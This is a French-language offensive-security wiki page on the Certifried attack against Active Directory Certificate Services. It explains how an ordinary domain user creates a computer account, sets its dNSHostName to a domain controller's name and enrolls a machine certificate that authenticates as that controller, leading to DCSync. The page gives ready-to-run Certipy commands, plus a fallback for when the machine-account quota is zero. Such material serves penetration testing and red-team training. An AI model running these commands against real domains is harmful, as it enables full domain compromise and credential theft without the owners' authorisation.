---
order: 7
title: "Certifried : certificat machine pour l'identité d'un contrôleur de domaine"
description: "Abuser du droit de création de compte machine par défaut et d'un mappage faible entre certificat et compte en créant un ordinateur, en définissant son dNSHostName sur celui d'un contrôleur de domaine, et en inscrivant un certificat machine qui s'authentifie en tant que ce DC."
keywords:
  - Certifried
  - dNSHostName
  - compte machine
  - Certipy
  - certificate mapping
---

# Certifried

Certifried transforme le **quota de comptes machine** par défaut en prise de contrôle d'un contrôleur de domaine. Par défaut, tout utilisateur peut créer des comptes ordinateur, et un certificat machine inscrit est remappé sur un compte par son **`dNSHostName`**. Si vous créez un ordinateur, définissez son `dNSHostName` pour correspondre à celui d'un **contrôleur de domaine**, et vous inscrivez sur un modèle machine, le certificat émis se mappe sur le **DC**, vous pouvez donc vous authentifier en tant que le DC et effectuer un DCSync. Il faut un utilisateur de domaine standard et une CA d'entreprise accessible, et cela fonctionne lorsque le **mappage fort de certificat n'est pas appliqué** : l'application du mappage fort de 2022 intègre le SID de la machine à l'origine de la requête dans le certificat et le KDC rejette le mappage DC incohérent, limitez donc cela aux systèmes sans cette application ou avec un mappage explicitement affaibli.

## L'attaque

```bash
# 1. Create a computer account and set its dNSHostName to the target DC's FQDN
certipy account create -u user@example.local -p <password> -user 'attacker$' \
  -pass 'Password123!' -dns dc01.example.local -dc-ip <dc>

# 2. Enroll a certificate on a machine template as that computer
certipy req -u 'attacker$'@example.local -p 'Password123!' -ca 'EXAMPLE-CA' -template Machine -dc-ip <dc>

# 3. The certificate maps to the DC; authenticate and recover the DC credentials
certipy auth -pfx dc01.pfx -dc-ip <dc>
```

## Notes d'exploitation

- Le levier est le **quota de comptes machine** (10 par défaut) plus le mappage basé sur `dNSHostName`, de sorte qu'un simple utilisateur de domaine atteint une identité de DC sans droits particuliers.
- C'est étroitement lié aux faiblesses de [mappage de certificat](certificate-mapping.md) : Certifried exploite la manière dont la CA et le KDC résolvent un certificat vers un compte, ce que le durcissement du mappage fort a ensuite resserré.
- Lorsque le quota est à zéro ou que la création est refusée, réutilisez plutôt un ordinateur existant que vous contrôlez et réécrivez son `dNSHostName`, si vous disposez d'un accès en écriture sur celui-ci.
- Le gain est un certificat pour le **compte machine du DC**, qui, via le [pass-the-certificate](theft-and-pass-the-certificate.md), donne un DCSync, il s'agit donc d'un chemin direct de compromission de domaine depuis un utilisateur non privilégié.

## Outils

- **Certipy** (`account create`, `req`, `auth`) : créer l'ordinateur, s'inscrire et s'authentifier en tant que le DC.
- **addcomputer.py / impacket** : création alternative de compte ordinateur au besoin.

## Références

- [Certipy wiki: privilege escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [HackTricks: AD CS domain escalation](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
- [The Hacker Recipes: AD CS certificate templates](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
